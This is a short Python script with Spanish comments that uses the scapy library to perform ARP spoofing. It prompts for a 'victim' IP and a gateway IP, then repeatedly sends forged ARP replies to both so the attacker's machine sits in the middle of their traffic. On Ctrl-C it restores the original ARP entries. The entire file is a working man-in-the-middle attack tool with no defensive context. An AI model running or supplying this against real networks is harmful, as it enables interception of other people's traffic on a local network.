import scapy.all as scapy
import time

interval = 4  #intervalo de tiempo entre cada envío de paquetes ARP
ip_target = input("Ingrese la IP de la victima: ")
ip_gateway = input("Ingrese la IP del router o puerta de enlace: ")

def spoof(target_ip, spoof_ip): #Esta función crea y envía un paquete ARP falsificado que hace que el objetivo (target_ip) asocie la dirección IP del spoof_ip con la dirección MAC del atacante.
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = scapy.getmacbyip(target_ip), psrc = spoof_ip)
    scapy.send(packet, verbose = False)
   
def restore(destination_ip, source_ip): #envía un paquete ARP legítimo para restaurar la tabla ARP a su estado original. Esto se hace enviando la dirección IP real con su dirección MAC correcta.
    destination_mac = scapy.getmacbyip(destination_ip)
    source_mac = scapy.getmacbyip(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)
  
try:
    while True: #se envían repetidamente paquetes ARP falsificados para ambas direcciones IP (la del objetivo y la del gateway) con un intervalo de tiempo 
        spoof(ip_target, ip_gateway)
        spoof(ip_gateway, ip_target)
        time.sleep(interval)
except KeyboardInterrupt: #restaurar las tablas ARP a su estado legítimo.
    restore(ip_gateway, ip_target)
    restore(ip_target, ip_gateway)